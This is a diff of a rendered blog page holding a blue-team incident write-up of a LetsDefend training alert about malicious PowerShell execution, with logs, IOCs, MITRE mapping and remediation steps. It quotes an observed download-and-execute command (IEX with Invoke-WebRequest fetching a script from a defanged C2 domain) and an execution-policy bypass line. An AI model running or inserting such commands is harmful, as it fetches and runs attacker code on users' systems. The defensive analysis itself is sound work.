@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection :: Hello w3nch</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Event ID: 238
 Rule Name: SOC153 – Suspicious PowerShell Script Executed
 Severity: HIGH
@@ -13,76 +13,96 @@ Category: Endpoint Compromise / Malware
 Event Time: March 14, 2024 – 05:23 PM
 Compromised Host: Tony (172.16.17.206)
 Tony at work opened a suspicious file they probably shouldn&amp;rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&amp;rsquo;t know what&amp;rsquo;s on it, but it starts doing things automatically." />
-<meta name="keywords" content=", letsdefend, soc, blue-team, malware-analysis, powershell, endpoint-security" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
 <link rel="canonical" href="http://localhost:1313/writeups/letsdefend/alerts/soc153---suspicious-powershell-script-executedname/" />
 
 
-    <title>
-        
-            SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection :: Hello w3nch 
-        
-    </title>
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.64355604529405b8a6a03699668a57f6e03d8fd15b6b3b96cf9364bf18a602f8.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/writeups.min.f97cbcd47e8113ea91483092b8ce27fd630e9643fa563f0ba30c56c5fb1557c4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
 
 
 
 
 
-  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
 
 
 
-
-    
-        <link rel="stylesheet" type="text/css" href="css/code.css">
-    
-
-    
-        <link rel="stylesheet" type="text/css" href="css/writeups.css">
-    
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
-    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection">
-<meta itemprop="description" content="Event ID: 238
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection">
+<meta property="og:description" content="Event ID: 238
 Rule Name: SOC153 – Suspicious PowerShell Script Executed
 Severity: HIGH
 Category: Endpoint Compromise / Malware
 Event Time: March 14, 2024 – 05:23 PM
 Compromised Host: Tony (172.16.17.206)
-Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&rsquo;t know what&rsquo;s on it, but it starts doing things automatically."><meta itemprop="datePublished" content="2026-02-03T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2026-02-03T00:00:00+00:00" />
-<meta itemprop="wordCount" content="729">
-<meta itemprop="keywords" content="letsdefend,soc,blue-team,malware-analysis,powershell,endpoint-security," />
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection"/>
-<meta name="twitter:description" content="Event ID: 238
-Rule Name: SOC153 – Suspicious PowerShell Script Executed
-Severity: HIGH
-Category: Endpoint Compromise / Malware
-Event Time: March 14, 2024 – 05:23 PM
-Compromised Host: Tony (172.16.17.206)
-Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&rsquo;t know what&rsquo;s on it, but it starts doing things automatically."/>
+Tony at work opened a suspicious file they probably shouldn&amp;rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&amp;rsquo;t know what&amp;rsquo;s on it, but it starts doing things automatically." />
+<meta property="og:url" content="http://localhost:1313/writeups/letsdefend/alerts/soc153---suspicious-powershell-script-executedname/" />
+<meta property="og:site_name" content="Hello w3nch" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="SOC Writeups" />
+
+  <meta property="article:section" content="Malware &amp; Endpoint" />
 
 
-
-
-
-    <meta property="article:section" content="SOC Writeups" />
-
-    <meta property="article:section" content="Malware &amp; Endpoint" />
-
-
-
-    <meta property="article:published_time" content="2026-02-03 00:00:00 &#43;0000 UTC" />
+  <meta property="article:published_time" content="2026-02-03 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -95,89 +115,129 @@ Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was
 
 
 
-    </head>
+</head>
+<body>
 
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">></span>
-            <span class="logo__text ">
-                hello ;)</span>
-            <span class="logo__cursor" style=
-                  "
-                   
-                   ">
-            </span>
-        
-    </div>
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    hello ;)
+  </div>
 </a>
 
-
-        <span class="header__right">
-                <nav class="menu">
-    <ul class="menu__inner">
-                <li><a href="/about/">About</a></li>
-            
-                <li><a href="/posts/">Blog</a></li>
-            
-                <li><a href="/contact/">Contact</a></li>
-            
-                <li><a href="/resume.pdf">Resume</a></li>
-            
-                <li><a href="/writeups/">Writeup</a></li>
-            
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/posts/">Blog</a></li>
+        
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/contact/">Contact</a></li>
+        
+      
+        
+          <li><a href="/resume.pdf">Resume</a></li>
+        
+      
+        
+          <li><a href="/writeups/">Writeup</a></li>
+        
+      
+      
     </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/posts/" >Blog</a></li>
+        
+      
+        
+          <li><a href="/about/" >About</a></li>
+        
+      
+        
+          <li><a href="/contact/" >Contact</a></li>
+        
+      
+        
+          <li><a href="/resume.pdf" >Resume</a></li>
+        
+      
+        
+          <li><a href="/writeups/" >Writeup</a></li>
+        
+      
+      
+    
+  </ul>
 </nav>
 
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
+  
 </header>
 
 
-            
-    <div class="content">
-        <main class="post">
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/writeups/letsdefend/alerts/soc153---suspicious-powershell-script-executedname/">SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-02-03</time></div>
 
-            <div class="post-info">
-                
-                </p>
-            </div>
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/letsdefend/">letsdefend</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/soc/">soc</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/blue-team/">blue-team</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/malware-analysis/">malware-analysis</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/powershell/">powershell</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/endpoint-security/">endpoint-security</a>&nbsp;
+      
+    </span>
+  
+  
 
-            <article>
-                <h2 class="post-title"><a href="http://localhost:1313/writeups/letsdefend/alerts/soc153---suspicious-powershell-script-executedname/">SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection</a></h2>
 
-                
-                
-                
+  
 
-                <div class="post-content">
-                    <p><strong>Event ID:</strong> 238<br>
+  <div class="post-content"><div>
+        <p><strong>Event ID:</strong> 238<br>
 <strong>Rule Name:</strong> SOC153 – Suspicious PowerShell Script Executed<br>
 <strong>Severity:</strong> HIGH<br>
 <strong>Category:</strong> Endpoint Compromise / Malware<br>
 <strong>Event Time:</strong> March 14, 2024 – 05:23 PM<br>
 <strong>Compromised Host:</strong> Tony (172.16.17.206)</p>
 <p>Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer  you don&rsquo;t know what&rsquo;s on it, but it starts doing things automatically.It ran some code that gave access to the malicious actors who have now taken over the system in this scenario.</p>
-<h2 id="incident-analysis-summary">Incident Analysis Summary</h2>
+<h2 id="incident-analysis-summary">Incident Analysis Summary<a href="#incident-analysis-summary" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <table>
 <thead>
 <tr>
@@ -208,11 +268,11 @@ Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was
 </tr>
 </tbody>
 </table>
-<h2 id="1-alert-overview">1. Alert Overview</h2>
+<h2 id="1-alert-overview">1. Alert Overview<a href="#1-alert-overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>The alert was triggered due to the execution of a suspicious PowerShell script (<code>payload_1.ps1</code>) on an endpoint. The detection indicated potential malware or unwanted software execution using PowerShell with execution policy bypass techniques.</p>
 <p>Initial triage required verification of logs to determine whether the activity represented a <strong>false positive</strong> or a <strong>successful attack</strong>.</p>
-<p><img src="https://i.ibb.co/0v6tVcd/Pasted-image-20260203161116.png" alt=""></p>
-<h2 id="2-detection--verification">2. Detection &amp; Verification</h2>
+<p><img src="https://i.ibb.co/0v6tVcd/Pasted-image-20260203161116.png"></p>
+<h2 id="2-detection--verification">2. Detection &amp; Verification<a href="#2-detection--verification" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Log analysis was conducted in <strong>Log Management</strong> by searching for the affected host IP:</p>
 <p><strong>Client IP:</strong> <code>172.16.17.206</code></p>
 <p>The following log sources were reviewed:</p>
@@ -226,33 +286,33 @@ PowerShell operational logs confirmed execution of:</li>
 <li>Execution time: <strong>05:23 PM</strong>
 The script execution was observed under **PowerShell Event ID <a href="https://www.myeventlog.com/search/show/980">4104</a>, confirming script block logging.  Based on this evidence, the alert was verified as a <strong>True Positive</strong>.</li>
 </ul>
-<p><img src="https://i.ibb.co/JjMzT7LP/Pasted-image-20260203161456.png" alt=""></p>
-<h2 id="3-incident-analysis">3. Incident Analysis</h2>
-<h3 id="initial-access--drive-by-compromise">Initial Access – Drive-by Compromise</h3>
+<p><img src="https://i.ibb.co/JjMzT7LP/Pasted-image-20260203161456.png"></p>
+<h2 id="3-incident-analysis">3. Incident Analysis<a href="#3-incident-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="initial-access--drive-by-compromise">Initial Access – Drive-by Compromise<a href="#initial-access--drive-by-compromise" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>A search for <code>payload_1.ps1</code> revealed the following download source in proxy logs:</p>
 <pre tabindex="0"><code class="language-url" data-lang="url">hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
-</code></pre><p><img src="https://i.ibb.co/Xxr9JFd0/Pasted-image-20260203161819.png" alt=""></p>
+</code></pre><p><img src="https://i.ibb.co/Xxr9JFd0/Pasted-image-20260203161819.png"></p>
 <ul>
 <li>Proxy action: <strong>Allowed</strong></li>
 <li>No associated phishing email found in Email Security logs
 <strong>Conclusion:</strong>  Initial access occurred via <strong>Drive-by Compromise</strong>, where the user downloaded and executed a malicious script from the web rather than through email.</li>
 </ul>
-<h3 id="malware-execution">Malware Execution</h3>
+<h3 id="malware-execution">Malware Execution<a href="#malware-execution" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>The malicious PowerShell script was executed from the user’s
 <strong>Downloads</strong> directory and bypassed execution policy restrictions using the following command:
-<img src="https://i.ibb.co/svjJn1c5/Pasted-image-20260203161256.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ExecutionPolicy -Scope <span style="color:#66d9ef">Process</span> Bypass
+<img src="https://i.ibb.co/svjJn1c5/Pasted-image-20260203161256.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ExecutionPolicy</span> <span class="n">-Scope</span> <span class="k">Process</span> <span class="n">Bypass</span>
 </span></span></code></pre></div><p>Observed execution command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -Command IEX(IWR -UseBasicParsing <span style="color:#e6db74">&#39;hxxps://kionagranada.com/upload/sd2.ps1&#39;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-Command</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">-UseBasicParsing</span> <span class="s1">&#39;hxxps://kionagranada.com/upload/sd2.ps1&#39;</span><span class="p">)</span>
 </span></span></code></pre></div><p>This confirms:</p>
 <ul>
 <li>User execution</li>
 <li>PowerShell abuse</li>
 <li>Execution policy bypass</li>
 </ul>
-<h3 id="command--control-c2-activity">Command &amp; Control (C2) Activity</h3>
+<h3 id="command--control-c2-activity">Command &amp; Control (C2) Activity<a href="#command--control-c2-activity" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>Threat intelligence and log analysis identified outbound communication to:
-<img src="https://i.ibb.co/PzbLWJkC/Pasted-image-20260203161126.png" alt=""></p>
+<img src="https://i.ibb.co/PzbLWJkC/Pasted-image-20260203161126.png"></p>
 <pre tabindex="0"><code class="language-url" data-lang="url">kionagranada[.]com
 </code></pre><p>Resolved IP:</p>
 <pre tabindex="0"><code class="language-ip" data-lang="ip">161[.]22[.]46[.]148
@@ -262,17 +322,17 @@ The script execution was observed under **PowerShell Event ID <a href="https://w
 <li>Execution observed in process logs
 Firewall logs confirmed <strong>successful outbound connections</strong>, validating active <strong>Command &amp; Control communication</strong>.</li>
 </ul>
-<h2 id="4-reputation--threat-intelligence">4. Reputation &amp; Threat Intelligence</h2>
+<h2 id="4-reputation--threat-intelligence">4. Reputation &amp; Threat Intelligence<a href="#4-reputation--threat-intelligence" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>The SHA-256 hash of <code>payload_1.ps1</code> was analyzed using VirusTotal:
-<img src="https://i.ibb.co/Tq4yBbYr/Pasted-image-20260203161551.png" alt=""></p>
-<h3 id="virustotal-findings">VirusTotal Findings</h3>
+<img src="https://i.ibb.co/Tq4yBbYr/Pasted-image-20260203161551.png"></p>
+<h3 id="virustotal-findings">VirusTotal Findings<a href="#virustotal-findings" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li><strong>46 / 71 vendors</strong> flagged the file as malicious</li>
 <li>Classified as <strong>Trojan / PowerShell Downloader</strong></li>
 <li>Associated with additional payload delivery</li>
 <li>Network indicators linked to known malicious infrastructure</li>
 </ul>
-<h4 id="notable-powershell-cmdlets-observed">Notable PowerShell Cmdlets Observed</h4>
+<h4 id="notable-powershell-cmdlets-observed">Notable PowerShell Cmdlets Observed<a href="#notable-powershell-cmdlets-observed" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <ul>
 <li><code>Invoke-WebRequest (IWR)</code> – Remote payload retrieval</li>
 <li><code>Invoke-Expression (IEX)</code> – In-memory execution</li>
@@ -280,8 +340,8 @@ Firewall logs confirmed <strong>successful outbound connections</strong>, valida
 <li><code>Where-Object</code> – Data filtering</li>
 <li><code>Write-Output</code> – Script output handling</li>
 </ul>
-<p><img src="https://i.ibb.co/BVZ5ysXz/Pasted-image-20260203161623.png" alt=""></p>
-<h2 id="5-indicators-of-compromise-iocs">5. Indicators of Compromise (IOCs)</h2>
+<p><img src="https://i.ibb.co/BVZ5ysXz/Pasted-image-20260203161623.png"></p>
+<h2 id="5-indicators-of-compromise-iocs">5. Indicators of Compromise (IOCs)<a href="#5-indicators-of-compromise-iocs" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <table>
 <thead>
 <tr>
@@ -316,8 +376,8 @@ Firewall logs confirmed <strong>successful outbound connections</strong>, valida
 </tr>
 </tbody>
 </table>
-<p><img src="https://i.ibb.co/G3kTwJZX/Pasted-image-20260203165107.png" alt=""></p>
-<h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK Mapping</h2>
+<p><img src="https://i.ibb.co/G3kTwJZX/Pasted-image-20260203165107.png"></p>
+<h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK Mapping<a href="#6-mitre-attck-mapping" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <table>
 <thead>
 <tr>
@@ -359,39 +419,39 @@ Firewall logs confirmed <strong>successful outbound connections</strong>, valida
 </tr>
 </tbody>
 </table>
-<h2 id="7-sigma-rule-and-yara-rule">7. Sigma Rule and Yara Rule</h2>
+<h2 id="7-sigma-rule-and-yara-rule">7. Sigma Rule and Yara Rule<a href="#7-sigma-rule-and-yara-rule" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Sigma: <a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC153%20-%20Suspicious%20Powershell%20Script%20ExecutedName/Suspicious%20PowerShell%20IEX%20with%20Web%20Download.yml">Suspicious PowerShell IEX with Web Download</a></li>
 <li>Yara: <a href="https://github.com/w3nch/YARA-rules/blob/main/SOC153%20Event%20ID%20238/Malicious_PowerShell_Downloader.yml">Malicious_PowerShell_Downloader</a></li>
 </ul>
-<h2 id="immediate-actions-taken">Immediate Actions Taken</h2>
+<h2 id="immediate-actions-taken">Immediate Actions Taken<a href="#immediate-actions-taken" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ol>
 <li><strong>Containment</strong>: Endpoint containment initiated via EDR</li>
 <li><strong>C2 Confirmation</strong>: Verified C2 communication occurred</li>
 <li><strong>Threat Indicator</strong>: Marked as malicious infrastructure</li>
 </ol>
-<h2 id="recommended-next-steps">Recommended Next Steps</h2>
-<h3 id="short-term-remediation">Short-term (Remediation):</h3>
+<h2 id="recommended-next-steps">Recommended Next Steps<a href="#recommended-next-steps" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="short-term-remediation">Short-term (Remediation):<a href="#short-term-remediation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>Isolate host &ldquo;Tony&rdquo; from network</li>
 <li>Perform full malware scan/removal</li>
 <li>Reset credentials for affected user account</li>
 <li>Block C2 domains at firewall/proxy level</li>
 </ul>
-<h3 id="medium-term-prevention">Medium-term (Prevention):</h3>
+<h3 id="medium-term-prevention">Medium-term (Prevention):<a href="#medium-term-prevention" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>Implement PowerShell logging (Module/Transcript)</li>
 <li>Restrict PowerShell execution policies</li>
 <li>Enhance endpoint detection rules for IEX/IWR patterns</li>
 <li>User awareness training on suspicious downloads</li>
 </ul>
-<h3 id="long-term-hardening">Long-term (Hardening):</h3>
+<h3 id="long-term-hardening">Long-term (Hardening):<a href="#long-term-hardening" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>Application whitelisting for PowerShell</li>
 <li>Implement AMSI (Anti-Malware Scan Interface)</li>
 <li>Regular security baseline reviews</li>
 </ul>
-<h2 id="final-assessment">Final Assessment</h2>
+<h2 id="final-assessment">Final Assessment<a href="#final-assessment" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p><strong>True Positive - Active Malware Infection</strong></p>
 <p>The incident represents a successful malware execution with confirmed C2 communication. The attacker achieved initial access through user execution of a malicious PowerShell script, bypassed security controls, and established remote command capabilities.</p>
 <p><strong>Risk Level</strong>: CRITICAL</p>
@@ -409,72 +469,116 @@ Firewall logs confirmed <strong>successful outbound connections</strong>, valida
 <li>EDR solutions must actively block, not just alert</li>
 </ul>
 
-                </div>
-            </article>
+      </div></div>
 
-            <hr />
+  
 
-            <div class="post-info">
-                
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
-
-        <span class="tag"><a href="http://localhost:1313/tags/letsdefend/">letsdefend</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/blue-team/">blue-team</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/malware-analysis/">malware-analysis</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/powershell/">powershell</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/endpoint-security/">endpoint-security</a></span>
-        
-    </p>
-
-                
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="http://localhost:1313/categories/soc-writeups/">SOC Writeups</a></span>
-        <span class="tag"><a href="http://localhost:1313/categories/malware-endpoint/">Malware &amp; Endpoint</a></span>
-        
-    </p>
-
-            </div>
-        </main>
-    </div>
-
-
-            
-                <footer class="footer">
+  
     
-    <div class="footer__inner">
-        <div class="footer__content">
-            
-            <span><a href="http://localhost:1313/"></a></span>
-            <span></span>
-            
-            
-        </div>
-    </div>
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
     
+      <div class="copyright copyright--user">
+        <span>© 1337 w3nch</span>
     
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by Hugo</span>
-        </div>
-    </div>
-    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
 </footer>
 
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>
 
 
 
 
-    </body>
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+<script>
+(function() {
+  const themes = {
+    terminal: {
+      '--background': '#1a170f',
+      '--foreground': '#eceae5',
+      '--accent': '#eec35e'
+    },
+    latte: {
+      '--background': '#eff1f5',
+      '--foreground': '#4c4f69',
+      '--accent': '#dc8a78'
+    },
+    frappe: {
+      '--background': '#303446',
+      '--foreground': '#c6d0f5',
+      '--accent': '#f2d5cf'
+    },
+    macchiato: {
+      '--background': '#24273a',
+      '--foreground': '#cad3f5',
+      '--accent': '#f4dbd6'
+    },
+    mocha: {
+      '--background': '#1e1e2e',
+      '--foreground': '#cdd6f4',
+      '--accent': '#f5e0dc'
+    },
+    paper: {
+      '--background': '#faf9f6',
+      '--foreground': '#2d2d2d',
+      '--accent': '#4a4a4a'
+    }
+  };
+
+  const saved = localStorage.getItem('terminal-theme') || 'terminal';
+  function applyTheme(name) {
+    const t = themes[name] || themes.terminal;
+    for (const [k, v] of Object.entries(t)) {
+      document.documentElement.style.setProperty(k, v);
+    }
+    localStorage.setItem('terminal-theme', name);
+    document.querySelectorAll('.theme-btn').forEach(b => {
+      b.classList.toggle('active', b.dataset.theme === name);
+    });
+  }
+
+  function createButtons() {
+    const nav = document.querySelector('.header__inner');
+    if (!nav) return;
+    const div = document.createElement('div');
+    div.className = 'theme-switcher';
+    div.style.cssText = 'display:flex;gap:8px;align-items:center;margin-left:12px;';
+    Object.keys(themes).forEach(name => {
+      const btn = document.createElement('button');
+      btn.className = 'theme-btn';
+      btn.dataset.theme = name;
+      btn.textContent = name.charAt(0).toUpperCase() + name.slice(1);
+      btn.style.cssText = 'padding:4px 10px;font-size:0.75rem;border-width:2px;';
+      btn.onclick = () => applyTheme(name);
+      div.appendChild(btn);
+    });
+    nav.appendChild(div);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => { createButtons(); applyTheme(saved); });
+  } else {
+    createButtons();
+    applyTheme(saved);
+  }
+})();
+</script>
+</body>
 </html>
